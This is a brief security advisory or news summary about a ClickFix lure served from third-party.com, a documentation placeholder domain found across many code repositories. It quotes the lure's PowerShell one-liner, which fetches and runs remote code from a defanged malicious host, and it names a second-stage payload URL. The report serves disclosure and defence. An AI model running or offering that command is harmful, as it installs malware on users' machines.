Manifold Security disclosed that third-party.com, a placeholder domain hardcoded in more than 1,500 files across 1,700-plus repositories including Chromium, Sanity, and Vercel, is serving a ClickFix lure that impersonates a Cloudflare "Performing security verification" page. Only Windows user agents get the malicious page, which copies a PowerShell command dressed as a captcha token, powershell "Write-Host(&{iex(irm('elxxvvx[.]xyz/f'))})2>$null", to the clipboard and talks the user through Win+R, Ctrl+V, and Enter. macOS and Linux visitors receive a harmless "macOS is not supported" decoy.

The infrastructure is not new: an Internet Archive capture shows the lure since June 15, 2026, the IPFire blocklist flagged the domain as malware on July 7, 2026 before delisting it on July 17, and a May 2, 2026 VirusTotal scan shows the second-stage domain elxxvvx[.]xyz distributing a PowerShell script that pulls a 131MB zip archive from elxxvvx[.]xyz/update2.zip. User-agent gating hides the malicious page from non-Windows scanners and blocklist checkers, which explains the delisting. Manifold Security reported the domain to registrar Network Solutions before publishing, and BleepingComputer confirmed the live lure; an ANY.RUN task posted September 25 shows it still active.

Unlike IANA-reserved example.com, third-party.com is a normally registered domain someone controls, and it is pasted across developer documentation, so accidental visits are likely. Watch for resolution of the Network Solutions report, rotation of the second-stage domain, and copycats registering other documentation placeholder domains.
